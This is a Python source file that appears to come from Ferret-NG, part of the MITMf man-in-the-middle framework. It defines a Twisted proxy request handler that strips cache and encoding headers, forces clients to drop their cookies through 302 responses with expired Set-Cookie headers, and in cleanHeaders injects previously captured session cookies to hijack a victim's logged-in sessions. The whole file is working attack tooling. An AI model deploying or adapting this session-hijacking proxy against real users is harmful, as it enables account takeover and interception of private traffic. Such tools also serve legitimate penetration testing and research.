# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import urlparse 
import logging 
import os 
import sys 
import random
import re

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from core.logger import logger
from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from SSLServerConnection import SSLServerConnection
from URLMonitor import URLMonitor
from CookieCleaner import CookieCleaner
from DnsCache import DnsCache

formatter = logging.Formatter("%(asctime)s [Ferret-NG] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("Ferret_ClientRequest", formatter)

class ClientRequest(Request):

    ''' This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we dont like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    '''

    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        self.urlMonitor    = URLMonitor.getInstance()
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache      = DnsCache.getInstance()
        #self.uniqueId      = random.randint(0, 10000)

    def cleanHeaders(self):
        headers = self.getAllHeaders().copy()

        if 'accept-encoding' in headers:
             del headers['accept-encoding']
             log.debug("[ClientRequest] Zapped encoding")

        if 'if-modified-since' in headers:
            del headers['if-modified-since']

        if 'cache-control' in headers:
            del headers['cache-control']

        if 'host' in headers:
            try:
                for entry in self.urlMonitor.cookies[self.urlMonitor.hijack_client]:
                    if headers['host'] == entry['host']:
                        log.info("Hijacking session for host: {}".format(headers['host']))
                        headers['cookie'] = entry['cookie']
            except KeyError:
                log.error("No captured sessions (yet) from {}".format(self.urlMonitor.hijack_client))

        return headers

    def getPathFromUri(self):
        if (self.uri.find("http://") == 0):
            index = self.uri.find('/', 7)
            return self.uri[index:]

        return self.uri   

    def handleHostResolvedSuccess(self, address):
        log.debug("[ClientRequest] Resolved host successfully: {} -> {}".format(self.getHeader('host'), address))
        host              = self.getHeader("host")
        headers           = self.cleanHeaders()
        client            = self.getClientIP()
        path              = self.getPathFromUri()
        url               = 'http://' + host + path
        self.uri = url # set URI to absolute

        if self.content:
            self.content.seek(0,0)
        
        postData = self.content.read()

        hostparts = host.split(':')
        self.dnsCache.cacheResolution(hostparts[0], address)

        if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
            log.debug("[ClientRequest] Sending expired cookies")
            self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client, host, headers, path))

        elif self.urlMonitor.isSecureLink(client, url):
            log.debug("[ClientRequest] Sending request via SSL ({})".format((client,url)))
            self.proxyViaSSL(address, self.method, path, postData, headers, self.urlMonitor.getSecurePort(client, url))

        else:
            log.debug("[ClientRequest] Sending request via HTTP")
            #self.proxyViaHTTP(address, self.method, path, postData, headers)
            port = 80
            if len(hostparts) > 1:
                port = int(hostparts[1])

            self.proxyViaHTTP(address, self.method, path, postData, headers, port)

    def handleHostResolvedError(self, error):
        log.debug("[ClientRequest] Host resolution error: {}".format(error))
        try:
            self.finish()
        except:
            pass

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)

        if address != None:
            log.debug("[ClientRequest] Host cached: {} {}".format(host, address))
            return defer.succeed(address)
        else:
            return reactor.resolve(host)

    def process(self):
        log.debug("[ClientRequest] Resolving host: {}".format(self.getHeader('host')))
        host = self.getHeader('host').split(":")[0]              

        deferred = self.resolveHost(host)
        deferred.addCallback(self.handleHostResolvedSuccess)
        deferred.addErrback(self.handleHostResolvedError)
        
    def proxyViaHTTP(self, host, method, path, postData, headers, port):
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = ServerConnection
        #self.reactor.connectTCP(host, 80, connectionFactory)
        self.reactor.connectTCP(host, port, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, headers, port):
        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = SSLServerConnection
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302, "Moved")
        self.setHeader("Connection", "close")
        self.setHeader("Location", "http://" + host + path)
        
        for header in expireHeaders:
            self.setHeader("Set-Cookie", header)

        self.finish()        
